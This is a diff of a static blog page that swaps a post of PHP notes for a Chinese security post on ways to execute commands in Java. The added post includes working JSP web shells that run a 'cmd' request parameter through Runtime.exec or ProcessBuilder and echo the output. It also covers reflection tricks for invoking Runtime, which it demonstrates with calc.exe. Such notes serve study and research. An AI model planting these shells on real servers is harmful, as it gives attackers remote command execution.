@@ -9,7 +9,7 @@
     
     <title>
         
-            PHP开发记录one |
+            java命令执行 |
         
         p1k&#39;s blog
     </title>
@@ -143,7 +143,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation">PHP开发记录one</span>
+            <span class="title-hover-animation">java命令执行</span>
         </div>
 
         
@@ -159,7 +159,7 @@
                     <div class="meta-info">
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i> 2020-02-27 15:47:13
+        <i class="fas fa-edit"></i> 2021-01-26 19:52:24
     </span>
     
     
@@ -168,7 +168,7 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/%E5%BC%80%E5%8F%91/">开发</a>
+                        <a href="/tags/java/">java</a>
                     </li>
                 
             </ul>
@@ -191,26 +191,50 @@
         
 
         <div class="article-content markdown-body">
-            <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>记录一下$_FILES超全局数组</p>
-<p>第一个参数file 就是input标签的name</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&quot;file&quot;][&quot;name&quot;] - 被上传文件的名称</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;type&quot;] - 被上传文件的类型</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;size&quot;] - 被上传文件的大小，以字节计</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称</span><br><span class="line">$_FILES[&quot;file&quot;][&quot;error&quot;] - 由文件上传导致的错误代码</span><br></pre></td></tr></table></figure>
+            <p>这次记录一下java的命令执行的一些方式</p>
+<h1 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h1><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%=Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>))%&gt;</span><br></pre></td></tr></table></figure>
+<p>可以执行但是无法回显，可以利用curl 外带</p>
+<p>回显版本</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    InputStream is = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">    ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">byte</span>[] b=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> a=-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((a=is.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        baos.write(b,<span class="number">0</span>,a);</span><br><span class="line">    &#125;</span><br><span class="line">    out.write(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>注意out的write方法，要导入servlet.jar 和 jsp.jar包</p>
+<p>记录一下Java安全漫谈里提到的一个问题</p>
+<p>为什么要用getRuntime来获取Runtime类，Runtime类的构造方法，是私有的，不能被外面访问</p>
+<p>看下面这个例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*        Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);</span></span><br><span class="line"><span class="comment">        clazz.getMethod(&quot;exec&quot;,</span></span><br><span class="line"><span class="comment">                String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),</span></span><br><span class="line"><span class="comment">                &quot;calc.exe&quot;);*/</span></span><br><span class="line">         <span class="comment">//等价于</span></span><br><span class="line">        Class c1 = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Method runtime = c1.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="comment">//Runtime runtime1 = (Runtime) runtime.invoke(c1);</span></span><br><span class="line">        Object runtime2 = runtime.invoke(c1);</span><br><span class="line">        Method m1 = c1.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">        System.out.println(m1.invoke(runtime2,<span class="string">&quot;calc.exe&quot;</span>));</span><br></pre></td></tr></table></figure>
+<p>这个问题其实也是可以解决的，使用 getDeclaredMethod方法，就可以获取私有方法，或者getDeclaredConstructor</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">    Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line">    m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
-<p>移动文件 move_uploaded_file(文件名,要移动到的目录)</p>
-<h1 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h1><p>记录一下一些面向对象的知识点</p>
-<h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p>匿名函数也叫闭包函数，允许临时创建一个没有指定名称的函数，经常作为回调函数使用</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printf(<span class="string">&quot;Hello %s\r\n&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$greet</span>(<span class="string">&#x27;World&#x27;</span>);</span><br><span class="line"><span class="variable">$greet</span>(<span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 
-<p>第二种形式</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;My name is &#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;)(<span class="string">&#x27;Wu Xiancheng&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>还有很多种调用方式，可以参考下webshell绕过</p>
-<h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>简单来说，给一个函数的参数，传入了一个函数，就叫函数回调</p>
-<p>比较常用的有</p>
-<p><code>call_user_fun</code>  <a class="link" target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.call-user-func.php">https://www.php.net/manual/zh/function.call-user-func.php<i class="fas fa-external-link-alt"></i></a> </p>
-<p><code>call_user_fun_array</code>  <a class="link" target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.call-user-func-array.php">https://www.php.net/manual/zh/function.call-user-func-array.php<i class="fas fa-external-link-alt"></i></a> </p>
-<p><code>usort</code></p>
-<h2 id="object-转换为对象"><a href="#object-转换为对象" class="headerlink" title="(object)转换为对象"></a>(object)转换为对象</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$obj</span> = (<span class="keyword">object</span>) <span class="keyword">array</span>(<span class="string">&#x27;1&#x27;</span> =&gt; <span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">var_dump(<span class="keyword">isset</span>(<span class="variable">$obj</span>-&gt;&#123;<span class="string">&#x27;1&#x27;</span>&#125;)); <span class="comment">// PHP 7.2.0 后输出 &#x27;bool(true)&#x27;，之前版本会输出 &#x27;bool(false)&#x27; </span></span><br><span class="line">var_dump(key(<span class="variable">$obj</span>)); <span class="comment">// PHP 7.2.0 后输出 &#x27;string(1) &quot;1&quot;&#x27;，之前版本输出  &#x27;int(1)&#x27; </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="processBuilder"><a href="#processBuilder" class="headerlink" title="processBuilder"></a>processBuilder</h1><p>Runtime类的exec方法，在底层也是去调用了processBuilder类</p>
+<p>最基本的形式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure>
+
+
+<p>交互版本</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String args = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(args);</span><br><span class="line">    InputStream ins =pb.start().getInputStream();</span><br><span class="line">    ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((a=ins.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        baos.write(b,<span class="number">0</span>,a);</span><br><span class="line">    &#125;</span><br><span class="line">    out.write(<span class="keyword">new</span> String(baos.toByteArray()));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>反射获取</p>
+<p>processBuilder有两个构造方法，</p>
+<p>一个是传入List  还有一个是传入可变参数（java在运行时会把可变参数转换为数组，所以直接传入数组就可以）</p>
+<ul>
+<li><p>public ProcessBuilder(List command) </p>
+</li>
+<li><p>public ProcessBuilder(String… command) </p>
+</li>
+</ul>
+<p>第一种方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class c1 = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">c1.getMethod(<span class="string">&quot;start&quot;</span>).invoke(c1.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br></pre></td></tr></table></figure>
+<p>第二种方式</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;</span><br><span class="line">    Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">    ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> String[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
 
 
 
@@ -220,11 +244,11 @@
             <div class="post-copyright-info">
                 <div class="article-copyright-info-container">
     <ul>
-        <li>Post title：PHP开发记录one</li>
+        <li>Post title：java命令执行</li>
         <li>Post author：p1k</li>
-        <li>Create time：2020-02-27 15:47:13</li>
+        <li>Create time：2021-01-26 19:52:24</li>
         <li>
-            Post link：http://p1keman.github.io/2020/02/27/PHP开发记录one/
+            Post link：http://p1keman.github.io/2021/01/26/java命令执行/
         </li>
         <li>
             Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
@@ -238,29 +262,14 @@
         
             <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2020/02/29/%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84Linux%E5%91%BD%E4%BB%A4/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">一些常见的Linux命令</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2020/02/26/adword-web/"
+                           href="/2021/01/26/java%E5%A4%87%E5%BF%98%E5%BD%95/"
                         >
                             <span class="title flex-center">
-                                <span class="post-nav-title-item">adword-web</span>
+                                <span class="post-nav-title-item">java备忘录</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex-center">
@@ -382,7 +391,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1"><span class="nav-text">面向对象</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0"><span class="nav-text">匿名函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="nav-text">回调函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#object-%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%AF%B9%E8%B1%A1"><span class="nav-text">(object)转换为对象</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Runtime"><span class="nav-text">Runtime</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#processBuilder"><span class="nav-text">processBuilder</span></a></li></ol>
     </div>
 </div>
         </aside>
